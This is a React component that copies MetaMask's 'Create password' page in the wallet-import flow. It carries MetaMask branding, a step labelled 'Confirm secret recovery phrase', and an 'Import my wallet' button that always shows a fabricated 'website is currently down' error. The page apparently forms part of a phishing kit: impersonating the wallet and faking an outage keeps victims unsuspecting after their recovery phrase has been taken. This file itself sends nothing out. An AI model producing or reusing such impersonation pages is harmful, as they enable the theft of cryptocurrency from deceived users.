import React, { useState, useEffect } from "react";
import logo from "../assets/images/logo.png";

// ErrorPopup Component
const ErrorPopup = ({ message, onClose }) => {
  const [errorCode, setErrorCode] = useState("");

  useEffect(() => {
    // Generate a random 4-digit error code prefixed with 'ERR-'
    const generateErrorCode = () => {
      const randomNumber = Math.floor(1000 + Math.random() * 9000);
      return `ERR-${randomNumber}`;
    };

    setErrorCode(generateErrorCode());
  }, []);

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50">
      {/* Backdrop Overlay */}
      <div
        className="absolute inset-0 bg-black opacity-50"
        onClick={onClose}
      ></div>

      {/* Modal Content */}
      <div className="bg-[#141618] rounded-lg shadow-lg z-10 p-6 max-w-sm w-full mx-4">
        {/* Header */}
        <div className="flex items-center justify-center mb-4">
          <i className="fas fa-exclamation-triangle text-[rgb(67,174,252)] text-3xl mr-2"></i>
          <h2 className="text-2xl font-bold text-center text-[rgb(67,174,252)]">Error</h2>
        </div>

        {/* Error Code */}
        <p className="text-center mb-2 font-mono text-white-800">
          {errorCode}
        </p>

        {/* Explanation */}
        <p className="text-center mb-6 text-white-700">
          {message}
        </p>

        {/* Dismiss Button */}
        <div className="flex justify-center">
          <button
            onClick={onClose}
            className="px-6 py-2 bg-[rgb(67,174,252)] text-white rounded hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-400"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

const CreatePassword = () => {
  const [agreed, setAgreed] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // State for Error Popup
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const handleWalletImport = () => {
    if (!agreed) return;

    // Simulate an error scenario
    setErrorMessage("The website is currently down. Please try your request again later.");
    setShowErrorPopup(true);

    // If you have an actual API call, handle errors accordingly
    /*
    fetch('/api/import-wallet', {
      method: 'POST',
      // ...other fetch options
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Failed to import wallet.');
        }
        // Handle successful import
      })
      .catch(error => {
        setErrorMessage(error.message || "An unexpected error occurred.");
        setShowErrorPopup(true);
      });
    */
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center overflow-x-hidden"
      style={{ backgroundColor: "#141618", color: "var(--color-text-default)" }}
    >
      {/* NAVBAR (top) */}
      <nav className="h-16 flex items-center justify-between w-11/12 md:w-10/12">
        <div className="flex items-center space-x-2">
          <img src={logo} alt="MetaMask" className="h-6 w-auto" />
        </div>
        <select className="border border-gray-500 bg-[rgb(20,22,24)] text-white px-14 py-2 rounded-md">
          <option>English</option>
          <option>Spanish</option>
          <option>French</option>
        </select>
      </nav>

      {/* MAIN CONTENT */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="relative w-full max-w-md rounded-xl p-6 md:p-4 pb-14 border border-zinc-800">
          {/* Step Indicator */}
          <div className="flex items-center justify-center mb-6">
            {/* Fixed container width to position circles & line accurately */}
            <div className="relative w-[350px] h-[40px]">
              {/* Black line behind the circles */}
              <div className="absolute h-0.5 bg-custom top-2 left-20 right-20 -translate-y-1/2" />

              {/* STEP 1 */}
              <div
                className="absolute flex flex-col items-center"
                style={{
                  left: 0,
                  top: "50%",
                  transform: "translateY(-50%)",
                }}
              >
                <div className="w-8 h-8 rounded-full border-2 border-[rgb(67,174,252)] bg-[rgb(67,174,252)] text-[#141618] font-bold flex items-center justify-center">
                  1
                </div>
                <p className="text-xs mt-1 text-[rgb(67,174,252)]">
                  Confirm secret recovery phrase
                </p>
              </div>

              {/* STEP 2 */}
              <div
                className="absolute flex flex-col items-center"
                style={{
                  right: 25,
                  top: "50%",
                  transform: "translateY(-50%)",
                }}
              >
                <div className="w-8 h-8 rounded-full border-2 border-[rgb(67,174,252)] bg-[#141618] text-[rgb(67,174,252)] font-bold flex items-center justify-center">
                  2
                </div>
                <p className="text-xs mt-1 text-[rgb(67,174,252)]">
                  Create password
                </p>
              </div>
            </div>
          </div>

          {/* Title & SubTitle */}
          <h2 className="text-xl md:text-2xl font-bold text-center mb-2 text-white">
            Create password
          </h2>
          <p
            className="text-center mb-4"
            style={{
              fontWeight: "1rem", // Corrected from "1.rem" to "1rem"
            }}
          >
            This password will unlock your MetaMask wallet only on this device. MetaMask cannot recover this password.
          </p>

          {/* Password Fields */}
          <div className="flex flex-col items-start w-full max-w-xs mx-auto mb-6 space-y-4">
            {/* New Password */}
            <div className="flex items-center justify-between w-full">
              <label htmlFor="newPassword" className="text-sm text-white">
                New password (8 characters min)
              </label>
              <button
                type="button"
                className="text-sm text-[rgb(67,174,252)] focus:outline-none"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>
            <input
              id="newPassword"
              type={showPassword ? "text" : "password"}
              className="w-full px-4 py-2 border border-gray-500 rounded-md bg-[#141618] text-white placeholder-gray-400 focus:outline-none focus:border-[rgb(67,174,252)]"
              placeholder="Enter your new password"
            />

            {/* Confirm Password */}
            <label htmlFor="confirmPassword" className="text-sm text-white">
              Confirm password
            </label>
            <input
              id="confirmPassword"
              type={showPassword ? "text" : "password"}
              className="w-full px-4 py-2 border border-gray-500 rounded-md bg-[#141618] text-white placeholder-gray-400 focus:outline-none focus:border-[rgb(67,174,252)]"
              placeholder="Re-enter your password"
            />
          </div>

          {/* Agree Checkbox */}
          <div className="agree-box flex items-center ml-6 mb-6 space-x-6">
            <input
              type="checkbox"
              checked={agreed}
              onChange={() => setAgreed(!agreed)}
              className="custom-checkbox-2"
              id="agree-terms"
            />
            <label htmlFor="agree-terms" className="text-xs text-gray-300 text-start ml-4">
              I understand that MetaMask cannot recover this password for me.
            </label>
          </div>

          {/* Import Wallet Button */}
          <div className="flex flex-col items-center space-y-6">
            <button
              disabled={!agreed}
              className={`create-button py-3 text-sm rounded-full font-medium ${
                agreed
                  ? "bg-[#43AEFC] hover:bg-opacity-90 text-black"
                  : "bg-[#43AEFC] bg-opacity-40 text-black cursor-not-allowed"
              }`}
              onClick={handleWalletImport}
            >
              Import my wallet
            </button>
          </div>
        </div>
      </div>

      {/* Error Popup */}
      {showErrorPopup && (
        <ErrorPopup
          message={errorMessage}
          onClose={() => setShowErrorPopup(false)}
        />
      )}
    </div>
  );
};

export default CreatePassword;
